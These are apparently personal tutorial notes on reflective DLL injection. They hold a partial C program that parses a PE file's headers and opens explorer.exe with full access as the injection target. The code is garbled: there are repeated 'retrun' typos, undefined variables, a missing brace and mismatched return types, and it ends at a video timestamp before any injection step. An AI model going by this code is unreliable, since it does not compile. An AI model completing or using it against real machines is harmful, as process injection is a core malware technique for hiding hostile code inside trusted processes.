# Reflective Injection

**Reflective injection is a technique that allows an attacker to  inject a DLL into a target process from memory rather than disk. ** 

An extra function will be exported in the DLL and that will be **position independent** function. 


## code
    // https://www.youtube.com/watch?v=EZUoCCFVZXQ
    #include <stdio.h>
    #include <Windows.h>
    #include <string.h>
    
    typedef struct _PE_INFO {
      LPVOID base;
      BOOL Reloc; //If base relocation is needed
      LPVOID Get_Proc; //Address of GetProcAddress function 
      LPVOID Load_Dll; //Address of LoadLibraryA
    }PE_INFO, * LPE_INFO;
    
    
    // This function gives us the data of Target Process using which we will read its headers
    DWORD ReadTargetProcessMemory(char * ProcessName) {
        HANDLE hProcess;
        DWORD fileSize;
        LPVOID fileData = NULL;
        DWORD byteRead = NULL
        
        hProcess = CreateFileA(ProcessName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	    if (file == INVALID_HANDLE_VALUE) {
            printf("Could not read file");
        }
        
        fileSize = GetFileSize(hProcess, NULL);
	    fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
        if (!fileData) {
            printf("Failed to allocate heap memory");
        }
        
        ReadFile(hProcess, fileData, fileSize, &bytesRead, NULL);
        
        return fileData;
    }
    
    
    // This function will find the pid of the target process. Name of the target process will be given by command line argument
    HANDLE FindProcess(const char* processName) {
      HANDLE hSnapshot, hProcess; 
      PROCESSENTRY32 pe;
      pe.dwSize = sizeof(pe);
      BOOL found = 0;
      
      if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
        return 1;
      }
    
      if(!Process32First(hSnapshot, &pe)) {
        return 1;
      }
      
      do {
        if (!strcmp(pe.szExeFile , processName)) {
          found = 1;
          break;
        }
      } while (Process32Next(hSnapshot, &pe));
      
      if (!found) {
        printf("Processnot found\n");
        retrun 1;
      }
      
      if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pe.th32ProcessID)) == NULL) {    //take a look we are asing foe all access.
                                                                                          //This can give error for someother process
        printf("Failed to open process\n");
        return 1;
      }
      
      else 
      retrun hProcess;
    }
    
    
    int main(int argc, char* argv[]) {
   
      if (argc != 2){
        printf("usage: <DLL path>");
      }
      
      HANDLE hProcess;
      DWORD base;
      PIMAGE_DOS_HEADER dos;
      PIMAGE_NT_HEADERS nt;  
      PIMAGE_SECTION_HEADER sec;
      
      base = ReadTargetProcessMemory(argv[1]);
      if (!base) {
        printf("Failed to read file");
        retrun 1;
      }
      
      dos = (PIMAGE_DOS_HEADER)base;
      if (dos->e_magic != 23117) {
        printf("Invalid file");
        retrun 1;
      }
      
      nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
      sec = (PIMAGE_SECTION_HEADER)((LPVOID)nt +24 + nt->FileHeader.SizeOfOptionalHeader);
      
      if (nt->OptionalHeader.Magic != 523) {
        printf("This is not a 64-bit PE file");
        retrun 1;
      }
      
      hProcess = FindProcess("explorer.exe");
      if (!hProcess) {
        printf("Failed to open process");
        retrun 1;
      }
      
      //6:27
      
    return 0;
    }
